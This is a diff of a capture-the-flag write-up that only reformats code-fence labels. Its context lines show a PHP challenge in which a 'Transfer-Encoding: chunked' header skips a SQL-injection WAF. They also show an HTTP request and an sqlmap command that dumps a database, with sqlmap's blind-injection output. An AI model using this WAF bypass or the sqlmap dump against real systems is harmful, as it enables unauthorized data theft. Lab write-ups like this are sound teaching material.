@@ -65,7 +65,7 @@ While navigating through files if you looked at Cursor.php you’ll see two func
 
 `Note: If you don’t know what is a prepared statement, you can read about it here → https://www.w3schools.com/php/php_mysql_prepared_statements.asp`
 
-```
+```file.php
 <?php
 require_once 'Connect.php';
 
@@ -111,7 +111,7 @@ Seems like a WAF is being used (Actually you already know from the waf.php file 
 
 Let’s navigate through `waf.php`
 
-```
+```waf.php
 <?php
 function waf_sql_injection($input)
 {
@@ -175,7 +175,7 @@ But how we can bypass this WAF and reach the unsafequery function?
 
 While analyzing `SearchHandler.php`, we’ll see this if statement
 
-```
+```SearchHandler.php
 if (isset($_SERVER["HTTP_TRANSFER_ENCODING"]) && $_SERVER["HTTP_TRANSFER_ENCODING"] == "chunked")
 {
     $search = $_POST['search'];
@@ -200,11 +200,11 @@ This if statement looks for the Transfer-Encoding header with the value chunked 
 
 If we included the Transfer-Encoding: Chunked header in our request, we’ll reach the unsafequery function and inject some SQL.
 
-###Let’s get the flag
+### Let’s get the flag
 
 Request I used:
 
-```
+```HTTP
 POST /Controllers/Handlers/SearchHandler.php HTTP/1.1
 Host: host
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
@@ -229,7 +229,7 @@ sqlmap -r request --risk=3 --level=5 --dbms=sqlite --ignore-code=500 --dump -T p
 ```
 `sqlmap` will detect it's a blind SQL injection:
 
-```
+```SQLmap
 sqlmap resumed the following injection point(s) from stored session:
 
 Parameter: search (POST)
